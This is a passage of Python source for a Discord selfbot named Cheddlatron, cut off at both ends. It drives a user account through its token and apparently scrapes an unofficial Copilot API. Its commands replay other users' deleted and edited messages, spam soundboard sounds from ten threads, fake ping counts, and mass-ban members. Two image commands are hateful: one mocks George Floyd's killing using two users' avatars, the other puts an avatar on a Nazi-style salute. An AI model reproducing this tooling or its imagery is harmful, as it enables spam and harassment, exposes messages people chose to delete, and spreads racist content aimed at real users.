    response = session.get('https://copilot.microsoft.com/turing/conversation/create', params=params, headers=headers)
    response.raise_for_status()
    j = response.json()
    accesstoken = response.headers["X-Sydney-Encryptedconversationsignature"]
    conversationId = j["conversationId"]
    clientId = j["clientId"]
    
    ws = await establish_websocket(accesstoken)

    try:
        result = await queryCopilot(query, ws, conversationId, clientId)
        heading = "GPT-4 Response"
        body = result
        cmdname = "gpt"
        await panelmaker(ctx, heading, body, cmdname)
    finally:
        session.close()

message_history = {
    "deleted": defaultdict(list),
    "edited": defaultdict(list)
}

@Cheddlatron.event
async def on_message_delete(message):
    try:
        if message is None or message.author is None:
            logging.info("The message or message.author was None.")
            return
        
        if message.author == Cheddlatron.user:
            logging.info("Ignoring bot's own messages.")
            return
        
        channel_messages = message_history["deleted"][message.channel.id]
        channel_messages.append(message)
        if len(channel_messages) > 5:
            channel_messages.pop(0)

        logging.info(f"Stored deleted message from {message.author.name}: {message.content}")
    except Exception as e:
        logging.error(f"Error in on_message_delete: {e}")

@Cheddlatron.event
async def on_message_edit(before, after):
    try:
        if before.author == Cheddlatron.user or before.content == after.content:
            return
        
        message_history["edited"][before.channel.id].append({
            "before": before,
            "after": after
        })

        channel_messages = message_history["edited"][before.channel.id]
        if len(channel_messages) > 5:
            channel_messages.pop(0)
        logging.info(f"Stored edited message from {before.author.name}: '{before.content}' -> '{after.content}'")
    except Exception as e:
        logging.error(f"Error in on_message_edit: {e}")

@Cheddlatron.command(aliases=['sn', 'snipe'], description=f"Snipes a deleted message, Allows number of messages to be specified. \nUsage: {config_get('prefix')}snipemsg [Amount]", help="utility")
async def snipemsg(ctx, amount = 1):
    count = 0
    if amount > 5:
        amount = 5
    try:
        if ctx.channel.id in message_history["deleted"]:
            messages = message_history["deleted"][ctx.channel.id]
            if not messages:
                no_snipe_heading = "SnipeMsg"
                no_snipe_body = "There's nothing to snipe!"
                no_snipe_cmdname = "snipemsg"
                await panelmaker(ctx, no_snipe_heading, no_snipe_body, no_snipe_cmdname)
                return
            
            body = ""
            for message in reversed(messages):
                content = message.content[:1024]
                author = message.author.display_name
                body += f"\n{author}: {content}"
                count +=1
                if count == amount:
                    break
            
            heading = "Sniped Messages"
            cmdname = "SnipeMsg"
            await panelmaker(ctx, heading, body, cmdname)
        else:
            no_snipe_heading = "SnipeMsg"
            no_snipe_body = "There's nothing to snipe!"
            no_snipe_cmdname = "snipemsg"
            await panelmaker(ctx, no_snipe_heading, no_snipe_body, no_snipe_cmdname)
    except Exception as e:
        logging.error(f"Error in snipe command: {e}")

@Cheddlatron.command(aliases=['es', 'esnipe'], description=f"Snipes an edited message, Allows number of messages to be specified. \nUsage: {config_get('prefix')}editsnipe [Amount]", help="utility")
async def editsnipe(ctx, amount = 1):
    count = 0
    if amount > 5:
        amount = 5
    try:
        if ctx.channel.id in message_history["edited"]:
            edits = message_history["edited"][ctx.channel.id]
            if not edits:
                no_edit_snipe_heading = "EditSnipe"
                no_edit_snipe_body = "There's nothing to snipe!"
                no_edit_snipe_cmdname = "editsnipe"
                await panelmaker(ctx, no_edit_snipe_heading, no_edit_snipe_body, no_edit_snipe_cmdname)
                return
            
            body = ""
            for edit_info in reversed(edits):
                before_content = edit_info["before"].content[:1024]
                after_content = edit_info["after"].content[:1024]
                author = edit_info["before"].author.display_name
                body += f"\n{author}:\nBefore: {before_content}\nAfter: {after_content}"
                count +=1
                if count == amount:
                    break
            
            heading = "EditSniped Messages"
            cmdname = "EditSnipe"
            await panelmaker(ctx, heading, body, cmdname)
        else:
            no_edit_snipe_heading = "EditSnipe"
            no_edit_snipe_body = "There's nothing to snipe!"
            no_edit_snipe_cmdname = "editsnipe"
            await panelmaker(ctx, no_edit_snipe_heading, no_edit_snipe_body, no_edit_snipe_cmdname)
    except Exception as e:
        logging.error(f"Error in editsnipe command: {e}")

@Cheddlatron.command(description=f"Sets the amount of pings you have in a channel. \nUsage: {config_get('prefix')}setpings [amount of pings]", help="fun")
async def setpings(ctx, amount: int=9999):
    channel_id = ctx.channel.id
    thing = json.loads(requesters.get(f'https://canary.discord.com/api/v9/channels/{channel_id}/messages?limit=1', headers={'authorization': config_get('token')}).text)[0]
    j = requesters.post(f'https://canary.discord.com/api/v9/channels/{channel_id}/messages/{thing["id"]}/ack', headers={'authorization': config_get('token')}, json_data={"manual":True,"mention_count":amount})

@Cheddlatron.listen('on_ready')
async def on_ready3(data):
    global soundlist
    soundlist = [{'id': '1', 'emoid': None, 'gid': None, 'emoname': '🦆'}, {'id': '2', 'emoid': None, 'gid': None, 'emoname': '🔊'}, {'id': '3', 'emoid': None, 'gid': None, 'emoname': '🦗'}, {'id': '4', 'emoid': None, 'gid': None, 'emoname': '👏'}, {'id': '5', 'emoid': None, 'gid': None, 'emoname': '🎺'}, {'id': '6', 'emoid': None, 'gid': None, 'emoname': '🥁'}]
    for guild in data['guilds']: [soundlist.append({'id':sound['sound_id'], 'emoid': sound['emoji_id'], 'gid': sound['guild_id'], 'emoname': sound['emoji_name']}) for sound in guild['soundboard_sounds']]


def soundspammer():
    global soundspambool
    global stopper
    while True:
        if stopper == True:
            return
        if soundspambool:
            if currentvc:
                sound = random.choice(soundlist)
                soundid = sound['id']
                soundgid = sound['gid']
                soundemo = sound['emoid']
                soundemoname = sound['emoname']
                payload = {"sound_id":soundid,"emoji_id":soundemo}
                if soundemoname:
                    payload['emoji_name'] = soundemoname
                if soundgid:
                    payload['source_guild_id'] = soundgid
                url = f'https://discord.com/api/v9/channels/{currentvc}/send-soundboard-sound'
                requesters.post(url, headers={'authorization': config_get('token')}, json_data=payload)
        else: return
soundspambool = False

@Cheddlatron.command(description=f"Spams all possible soundboard sounds. \nUsage: {config_get('prefix')}soundspam", help="fun")
async def soundspam(ctx):
    heading = "Soundboard Spam"
    cmdname = "soundspam"
    if not currentvc:
            heading = "Error"
            body = "Please mute then unmute or rejoin vc then run the command again.\nOr join a vc if you're not in one."
            cmdname = "ERROR"
            await panelmaker(ctx, heading, body, cmdname)
            return
    global soundspambool
    if not soundspambool: 
        soundspambool = True
        body = "Starting soundspam"
        await panelmaker(ctx, heading, body, cmdname)
    else: 
        soundspambool = False
        body = 'Stopping soundspam'
        await panelmaker(ctx, heading, body, cmdname)
        return
    if len(soundlist) == 0: return
    for i in range(0, 10):
        threading.Thread(target=soundspammer).start()

@Cheddlatron.command(description=f"Bans any user who pings you in the server they pinged you from. \nUsage: {config_get('prefix')}userpingban", help="utility")
async def userpingban(ctx, user: discord.User):
    with open('Data\Settings\Configs\Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'userpingban' not in settings_data:
        settings_data['userpingban'] = []
        with open('Data\Settings\Configs\Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)

    if user.id in settings_data['userpingban']:
        settings_data['userpingban'].remove(user.id)  
        with open('Data\Settings\Configs\Settings.json', 'w') as file: 
            json.dump(settings_data, file, indent=4)
        heading = f"User Ping Ban"
        body = f"{user.name} removed from ping ban from all possible servers."
        cmdname = "userpingban"
    else:
        settings_data['userpingban'].append(user.id)
        with open('Data\Settings\Configs\Settings.json', 'w') as file:  
            json.dump(settings_data, file, indent=4)
        heading = f"User Ping Ban"
        body = f"{user.name} added to ping ban for all possible servers."
        cmdname = "userpingban"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Bans a user who pings you in the server this commands was used in. \nUsage: {config_get('prefix')}serverpingban", help="utility")
async def serverpingban(ctx):
    with open('Data\Settings\Configs\Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'serverpingban' not in settings_data:
        settings_data['serverpingban'] = []
        with open('Data\Settings\Configs\Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)
    if ctx.guild.me.guild_permissions.ban_members:
        if ctx.guild.id in settings_data['serverpingban']:
            settings_data['serverpingban'].remove(ctx.guild.id)  
            with open('Data\Settings\Configs\Settings.json', 'w') as file: 
                json.dump(settings_data, file, indent=4)
            heading = f"Server Ping Ban"
            body = f"{ctx.guild.name} removed from ping ban list."
            cmdname = "serverpingban"
        else:
            settings_data['serverpingban'].append(ctx.guild.id)
            with open('Data\Settings\Configs\Settings.json', 'w') as file:  
                json.dump(settings_data, file, indent=4)
            heading = f"Server Ping Ban"
            body = f"{ctx.guild.name} added to ping ban list."
            cmdname = "serverpingban"
    else:
        heading = "Error"
        body = "You do not have ban permissions in this server."
        cmdname = "ERROR"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Kicks any user who pings you in the server this commands was used in. \nUsage: {config_get('prefix')}serverpingkick", help="utility")
async def serverpingkick(ctx):
    with open('Data\Settings\Configs\Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'serverpingkick' not in settings_data:
        settings_data['serverpingkick'] = []
        with open('Data\Settings\Configs\Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)
    if ctx.guild.me.guild_permissions.ban_members:
        if ctx.guild.id in settings_data['serverpingkick']:
            settings_data['serverpingkick'].remove(ctx.guild.id)  
            with open('Data\Settings\Configs\Settings.json', 'w') as file: 
                json.dump(settings_data, file, indent=4)
            heading = f"Server Ping Kick"
            body = f"{ctx.guild.name} removed from ping kick list."
            cmdname = "serverpingkick"
        else:
            settings_data['serverpingkick'].append(ctx.guild.id)
            with open('Data\Settings\Configs\Settings.json', 'w') as file:  
                json.dump(settings_data, file, indent=4)
            heading = f"Server Ping Kick"
            body = f"{ctx.guild.name} added to ping kick list."
            cmdname = "serverpingkick"
    else:
        heading = "Error"
        body = "You do not have kick permissions in this server."
        cmdname = "ERROR"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Kicks a user who pings you in the server they pinged you from. \nUsage: {config_get('prefix')}userpingkick", help="utility")
async def userpingkick(ctx, user: discord.User):
    with open('Data\Settings\Configs\Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'userpingkick' not in settings_data:
        settings_data['userpingkick'] = []
        with open('Data\Settings\Configs\Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)

    if user.id in settings_data['userpingkick']:
        settings_data['userpingkick'].remove(user.id)  
        with open('Data\Settings\Configs\Settings.json', 'w') as file: 
            json.dump(settings_data, file, indent=4)
        heading = f"User Ping Kick"
        body = f"{user.name} removed from ping kick from all possible servers."
        cmdname = "userpingkick"
    else:
        settings_data['userpingkick'].append(user.id)
        with open('Data\Settings\Configs\Settings.json', 'w') as file:  
            json.dump(settings_data, file, indent=4)
        heading = f"User Ping Kick"
        body = f"{user.name} added to ping kick for all possible servers."
        cmdname = "userpingkick"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Adds a channel to the message logging list. \nUsage: {config_get('prefix')}logchannel [channel id]", help="utility")
async def logchannel(ctx, id=None):
    if not isinstance(ctx.channel, discord.TextChannel) or not isinstance(ctx.channel, discord.VoiceChannel):
            heading = "Error"
            body = "Please either enter a channel id or use this command in a guild channel."
            cmdname = "ERROR"
            await panelmaker(ctx, heading, body, cmdname)
            return
    channel_id = int(id) if id else ctx.channel.id
    channel = Cheddlatron.get_channel(channel_id)   
    with open('Data\Settings\Configs\Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'msglogids' not in settings_data:
        settings_data['msglogids'] = []
        with open('Data\Settings\Configs\Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)

    if channel_id in settings_data['msglogids']:
        settings_data['msglogids'].remove(channel_id)  
        with open('Data\Settings\Configs\Settings.json', 'w') as file: 
            json.dump(settings_data, file, indent=4)
        heading = f"Channel Log"
        body = f"Stopped logging {channel.name}"
        cmdname = "logchannel"
    else:
        settings_data['msglogids'].append(channel_id)
        with open('Data\Settings\Configs\Settings.json', 'w') as file:  
            json.dump(settings_data, file, indent=4)
        heading = f"Channel Log"
        body = f"Now logging {channel.name}"
        cmdname = "logchannel"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Fetches and displays the first message sent in a channel or DM. \nUsage: {config_get('prefix')}firstmsg", panel="fun")
async def firstmsg(ctx):
    if isinstance(ctx.channel, discord.DMChannel):
        async for message in ctx.channel.history(limit=1, oldest_first=True):
            await ctx.send(f"https://discord.com/channels/@me/{ctx.channel.id}/{message.id}")
            heading = "First DM Message"
            body = f"Author: {message.author.name}\nContent: {message.content}"
            cmdname = "firstmsg"
            await panelmaker(ctx, heading, body, cmdname)
    else:
        async for message in ctx.channel.history(limit=1, oldest_first=True):
            await ctx.send(f"https://discord.com/channels/{ctx.guild.id}/{ctx.channel.id}/{message.id}")
            heading = "First Server Message"
            body = f"Author: {message.author.name}\nContent: {message.content}"
            cmdname = "firstmsg"
            await panelmaker(ctx, heading, body, cmdname)

def make_circle(img):
    mask = Image.new("L", img.size, 0)
    draw = ImageDraw.Draw(mask)
    draw.ellipse((0, 0) + img.size, fill=255)

    out = ImageOps.fit(img, mask.size, centering=(0.5, 0.5))
    out.putalpha(mask)
    return out

@Cheddlatron.command(description=f"Creates a gigachad image with a users profile picture. \nUsage: {config_get('prefix')}gigachad [@user]", help="fun")
async def gigachad(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author
    response = requesters.get("https://cheddlatron.com/BotAssets/Images/gigachad.png")
    imge = Image.open(BytesIO(response.content)).convert("RGBA")
    avatar = str(user.avatar.replace(format='png'))
    response = requesters.get(avatar)
    img = Image.open(BytesIO(response.content)).convert("RGBA")
    circular_img = make_circle(img)
    pfp = circular_img.resize((207, 194))
    imge.paste(pfp, (135, 40), pfp)
    final_image_bytes = io.BytesIO()
    imge.save(final_image_bytes, format="PNG")
    final_image_bytes.seek(0)
    await ctx.send(file=discord.File(final_image_bytes, "Cheddlatron_Gigachad.png"))

@Cheddlatron.command(description=f"Creates a George Floyd image with 2 users profile pictures. \nUsage: {config_get('prefix')}derek <@user> <@user>", help="fun")
async def derek(ctx, user1: discord.User, user2: discord.User):
    response = requesters.get("https://cheddlatron.com/BotAssets/Images/derek.png")
    imge = Image.open(BytesIO(response.content)).convert("RGBA")
    for user in [user1, user2]:
        avatar = str(user.avatar.replace(format='png'))
        response = requesters.get(avatar)
        pfp = Image.open(BytesIO(response.content)).convert("RGBA")
        circular_pfp = make_circle(pfp)
        circular_pfp = circular_pfp.resize((80, 80))
        if user == user1:
            imge.paste(circular_pfp, (50, 0), circular_pfp)
        else:
            imge.paste(circular_pfp, (110, 290), circular_pfp)
    with BytesIO() as image_binary:
        imge.save(image_binary, 'PNG')
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename='Cheddlatron_Derek.png'))

@Cheddlatron.command(description=f"Creates an image of a profile picture on a nokia phone. \nUsage: {config_get('prefix')}nokia [@user]", help="fun")
async def nokia(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author
    response = requesters.get("https://cheddlatron.com/BotAssets/Images/nokia.png")
    img = Image.open(BytesIO(response.content))
    avatar = str(user.avatar.replace(format='png'))
    response = requesters.get(avatar)
    pfp = Image.open(BytesIO(response.content)).convert("RGBA")
    pfp = pfp.resize((233, 171))
    img.paste(pfp, (65, 159))
    with BytesIO() as image_binary:
        img.save(image_binary, 'PNG')
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename='Cheddlatron_Nokia.png'))

@Cheddlatron.command(description=f"Creates a ps4 game cover using a profile picute. \nUsage: {config_get('prefix')}ps4cover [@user]", help="fun")
async def ps4cover(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author
    response = requesters.get("https://cheddlatron.com/BotAssets/Images/ps4box.png")
    img = Image.open(BytesIO(response.content))
    avatar = str(user.avatar.replace(format='png'))
    response = requesters.get(avatar)
    pfp = Image.open(BytesIO(response.content)).convert("RGBA")
    pfp = pfp.resize((1073, 1190))
    img.paste(pfp, (2, 180))
    with BytesIO() as image_binary:
        img.save(image_binary, 'PNG')
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename='Cheddlatron_PS4Cover.png'))

@Cheddlatron.command(description=f"Speechbubbles an image and sends it as a gif. \nUsage: {config_get('prefix')}sbubble <url/attachment>", help="fun")
async def sbubble(ctx, url: str = None):
    if url:
        response = requesters.get(url)
    else:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            response = requesters.get(attachment.url)
        else:
            heading = "Error"
            body = "Please provide an image URL or attach an image."
            cmdname = "ERROR"
            await panelmaker(ctx, heading, body, cmdname)
            return
    response.raise_for_status()
    image_bytes = io.BytesIO(response.content)
    image = Image.open(image_bytes).convert("RGBA")
    bubble_response = requesters.get("https://cheddlatron.com/BotAssets/Images/speech_bubble.png")
    bubble_response.raise_for_status()
    bubble_image_bytes = io.BytesIO(bubble_response.content)
    bubble_image = Image.open(bubble_image_bytes).convert("RGBA")
    bubble_width = image.width
    bubble_height = int((bubble_image.height / bubble_image.width) * bubble_width)
    bubble_height = min(bubble_height, image.height // 8)
    bubble_image = bubble_image.resize((bubble_width, bubble_height), Image.Resampling.LANCZOS)
    x = (image.width - bubble_image.width) // 2
    y = 0
    image.paste(bubble_image, (x, y), bubble_image)
    output_bytes = io.BytesIO()
    image.save(output_bytes, format='PNG')
    output_bytes.seek(0)
    await ctx.send(file=discord.File(output_bytes, filename='Cheddlatron_SBubble.gif'))

@Cheddlatron.command(description=f"Creates an image of a pfp doing a roman salute. \nUsage: {config_get('prefix')}salute [@user]", help="fun")
async def salute(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author
    avatar = str(user.avatar.replace(format='png'))
    response = requesters.get("https://cheddlatron.com/BotAssets/Images/salute.png")
    base_image_bytes = io.BytesIO(response.content)
    imge = Image.open(base_image_bytes)
    avatar_response = requesters.get(str(avatar))
    avatar_image = Image.open(BytesIO(avatar_response.content)).convert("RGBA")
    avatar_size = (80, 80)
    avatar_image = avatar_image.resize(avatar_size)
    mask = Image.new("L", avatar_size, 0)
    draw = ImageDraw.Draw(mask)
    draw.ellipse((0, 0, avatar_size[0], avatar_size[1]), fill=255)
    avatar_image.putalpha(mask)
    imge.paste(avatar_image, (144, 12), avatar_image)
    output_bytes = io.BytesIO()
    imge.save(output_bytes, format='PNG')
    output_bytes.seek(0)
    await ctx.send(file=discord.File(output_bytes, filename='Cheddlatron_Salute.png'))

@Cheddlatron.command(description=f"Generates a unique username using discords username generation system. \nUsage: {config_get('prefix')}username", help="fun")
async def username(ctx):
    headers = {"Authorization": config_get('token'), "x-super-properties": getxsuper()}
    resp = requesters.get("https://discord.com/api/v9/unique-username/username-suggestions-unauthed", headers=headers).json()
    heading = "Unique Username"
    body = resp['username']
    cmdname = "username"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Shows your pc specs. \nUsage: {config_get('prefix')}specs", help="fun")
async def specs(ctx):
        platform_system = platform.system()
        platform_version = platform.version()
        cpu_info = cpuinfo.get_cpu_info()['brand_raw']
        cpu_MHz = cpuinfo.get_cpu_info()['hz_advertised_friendly']
        cpu_arc = cpuinfo.get_cpu_info()['arch']
        total_cores = psutil.cpu_count(logical=True)
        svmem = psutil.virtual_memory()
        total_memory = f"{svmem.total / (1024.0 **3):.2f} GB"
        gpus = GPUtil.getGPUs()
        sorted_gpus = sorted(gpus, key=lambda gpu: gpu.load, reverse=True)
        gpu = sorted_gpus[0]
        heading = "PC Specs"
        body = f"System: {platform_system}\nSystem Version: {platform_version}\nGPU: {gpu.name}\nGPU Vram: {gpu.memoryTotal} MB\nCPU: {cpu_info}\nCPU Cores: {total_cores}\nCPU MHz: {cpu_MHz}\nCPU Architecture: {cpu_arc}\nTotal RAM: {total_memory}"
        cmdname = "specs"
        await panelmaker(ctx, heading, body, cmdname)

#FUN COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#CODEBLOCK COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Creates a CSS codeblock. \nUsage: {config_get('prefix')}css <text>", help="codeblock")
async def css(ctx, *, msg):    
    await ctx.send(f"```css\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a BrainFuck codeblock. \nUsage: {config_get('prefix')}brainfuck <text>", help="codeblock")
async def brainfuck(ctx, *, msg):    
    await ctx.send(f"```brainfuck\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a MD codeblock. \nUsage: {config_get('prefix')}md <text>", help="codeblock")
async def md(ctx, *, msg):    
    await ctx.send(f"```md\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Fix codeblock. \nUsage: {config_get('prefix')}fix <text>", help="codeblock")
async def fix(ctx, *, msg):    
    await ctx.send(f"```fix\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a GLSL codeblock. \nUsage: {config_get('prefix')}glsl <text>", help="codeblock")
async def glsl(ctx, *, msg):    
    await ctx.send(f"```glsl\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Diff codeblock. \nUsage: {config_get('prefix')}diff <text>", help="codeblock")
async def diff(ctx, *, msg):    
    await ctx.send(f"```diff\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Bash codeblock. \nUsage: {config_get('prefix')}bash <text>", help="codeblock")
async def bash(ctx, *, msg):    
    await ctx.send(f"```bash\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a C# codeblock. \nUsage: {config_get('prefix')}cs <text>", help="codeblock")
async def cs(ctx, *, msg):    
    await ctx.send(f"```cs\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a C++ codeblock. \nUsage: {config_get('prefix')}cpp <text>", help="codeblock")
async def cpp(ctx, *, msg):    
    await ctx.send(f"```cpp\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Ini codeblock. \nUsage: {config_get('prefix')}ini <text>", help="codeblock")
async def ini(ctx, *, msg):    
    await ctx.send(f"```ini\n{msg}\n```")

@Cheddlatron.command(description=f"Creates an AsciiDoc codeblock. \nUsage: {config_get('prefix')}asciidoc <text>", help="codeblock")
async def asciidoc(ctx, *, msg):   
    await ctx.send(f"```asciidoc\n{msg}\n```")

@Cheddlatron.command(description=f"Creates an AutoHotKey codeblock. \nUsage: {config_get('prefix')}ahk <text>", help="codeblock")
async def ahk(ctx, *, msg):    
    await ctx.send(f"```autohotkey\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Python codeblock. \nUsage: {config_get('prefix')}python <text>", help="codeblock")
async def python(ctx, *, msg):    
    await ctx.send(f"```python\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Lua codeblock. \nUsage: {config_get('prefix')}lua <text>", help="codeblock")
async def lua(ctx, *, msg):    
    await ctx.send(f"```lua\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a PHP codeblock. \nUsage: {config_get('prefix')}php <text>", help="codeblock")
async def php(ctx, *, msg):    
    await ctx.send(f"```php\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Rust codeblock. \nUsage: {config_get('prefix')}rust <text>", help="codeblock")
async def rust(ctx, *, msg):    
    await ctx.send(f"```rust\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Java codeblock. \nUsage: {config_get('prefix')}java <text>", help="codeblock")
async def java(ctx, *, msg):    
    await ctx.send(f"```java\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Kotlin codeblock. \nUsage: {config_get('prefix')}kotlin <text>", help="codeblock")
async def kotlin(ctx, *, msg):    
    await ctx.send(f"```kotlin\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a JavaScript codeblock. \nUsage: {config_get('prefix')}js <text>", help="codeblock")
async def js(ctx, *, msg):    
    await ctx.send(f"```javascript\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a MySql codeblock. \nUsage: {config_get('prefix')}mysql <text>", help="codeblock")
async def mysql(ctx, *, msg):   
    await ctx.send(f"```MySQL\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a MarkDown codeblock. \nUsage: {config_get('prefix')}markdown <text>", help="codeblock")
async def markdown(ctx, *, msg):    
    await ctx.send(f"```markdown\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Ansi codeblock. \nUsage: {config_get('prefix')}ansi <text>", help="codeblock")
async def ansi(ctx, *, msg):    
    await ctx.send(f"```ansi\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a CoffeeScript codeblock. \nUsage: {config_get('prefix')}coffeescript <text>", help="codeblock")
async def coffeescript(ctx, *, msg):    
    await ctx.send(f"```coffeescript\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a HTML codeblock. \nUsage: {config_get('prefix')}html <text>", help="codeblock")
async def html(ctx, *, msg):    
    await ctx.send(f"```html\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Ruby codeblock. \nUsage: {config_get('prefix')}ruby <text>", help="codeblock")
async def ruby(ctx, *, msg):    
    await ctx.send(f"```ruby\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a Go-lang codeblock. \nUsage: {config_get('prefix')}go <text>", help="codeblock")
async def go(ctx, *, msg):    
    await ctx.send(f"```go\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a YAML codeblock. \nUsage: {config_get('prefix')}yaml <text>", help="codeblock")
async def yaml(ctx, *, msg):    
    await ctx.send(f"```yaml\n{msg}\n```")

@Cheddlatron.command(description=f"Creates a TypeScript codeblock. \nUsage: {config_get('prefix')}typescript <text>", help="codeblock")
async def typescript(ctx, *, msg):    
    await ctx.send(f"```typescript\n{msg}\n```")
#CODEBLOCK COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#MODERATION COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Unlocks a channel so people can talk in it after it being locked. \nUsage: {config_get('prefix')}unlock", help="moderation") 
async def unlock(ctx):    
    roles = list(ctx.guild.roles)
    overwrites = discord.PermissionOverwrite(send_messages=True)
    for role in roles:
        await ctx.channel.set_permissions(role, overwrite=overwrites)
    heading = "Unlocked!"
    body = "Channel Successfully Unlocked!"
    cmdname = "unlock"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Locks a channel so nobody can talk in it. \nUsage: {config_get('prefix')}lock", help="moderation") 
async def lock(ctx):    
    roles = list(ctx.guild.roles)
    overwrites = discord.PermissionOverwrite(send_messages=False)

    for role in roles:
        await ctx.channel.set_permissions(role, overwrite=overwrites)
    heading = "Locked!"
    body = "Channel Successfully Locked!"
    cmdname = "lock"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Locks all channels so nobody can send any messages anywhere. \nUsage: {config_get('prefix')}lockdown", help="moderation") 
async def lockdown(ctx):   
    roles = list(ctx.guild.roles)
    overwrites = discord.PermissionOverwrite(send_messages=False)   
    for channel in ctx.guild.text_channels:
        for role in roles:
            await channel.set_permissions(role, overwrite=overwrites)
    heading = "Locked Down!"
    body = "Whole Server Successfully Locked Down!"
    cmdname = "lockdown"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Allows people to talk in the server after a server lockdown. \nUsage: {config_get('prefix')}unlockdown", help="moderation") 
async def unlockdown(ctx):    
    roles = list(ctx.guild.roles)
    overwrites = discord.PermissionOverwrite(send_messages=True)    
    for channel in ctx.guild.text_channels:
        for role in roles:
            await channel.set_permissions(role, overwrite=overwrites)
    heading = "UnLocked Down!"
    body = "Whole Server Successfully UnLocked Down!"
    cmdname = "unlockdown"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Imports the bans from another server and bans everyone from the server the command was executed in. \nUsage: {config_get('prefix')}importbans <server id>", help="moderation")
async def importbans(ctx, server_id: int):    
    server = ctx.bot.get_guild(server_id)
    if server is None:
        heading = "ERROR"
        body = f"Server with ID {server_id} not found."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    try:
        banned_users = await server.bans()
    except discord.Forbidden:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}You don't have the necessary permissions to access bans in that server.")
        return
    for banned_entry in banned_users:
        user_id = banned_entry.user.id
        try:
            await ctx.guild.ban(discord.Object(id=user_id))
        except discord.NotFound:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}User with ID {user_id} not found.")
        except discord.Forbidden:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}You don't have the necessary permissions to unban user with ID {user_id}.")
        except discord.HTTPException:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}An error occurred while trying to unban user with ID {user_id}.")
    heading = "Import Bans"
    body = f"Bans successfully imported from {Cheddlatron.get_guild(server_id).name}"
    cmdname = "importbans"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Imports all emojis from given server into the new server where the command was used and stops when hitting the limit \nUsage: {config_get('prefix')}importemojis <server id>", help="moderation")  
async def importemojis(ctx, source_server_id: int):    
    source_server = ctx.bot.get_guild(source_server_id)
    destination_server = ctx.guild  
    if source_server is None:
        heading = "ERROR"
        body = f"Source server with ID {source_server_id} could not be found."
        cmdname = "importemojis"
        await panelmaker(ctx, heading, body, cmdname)
        return
    try:
        emojis = source_server.emojis
    except discord.Forbidden:
        print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}You don't have the necessary permissions to access emojis in the source server.")
        return
    emoji_limit = destination_server.emoji_limit
    for emoji in emojis:
        if len(destination_server.emojis) >= emoji_limit:
            heading = "Import Emojis"
            body = "Emoji limit reached. Stopping import."
            cmdname = "importemojis"
            await panelmaker(ctx, heading, body, cmdname)
            break
        try:
            await destination_server.create_custom_emoji(name=emoji.name, image=await emoji.url.read())
        except discord.Forbidden:
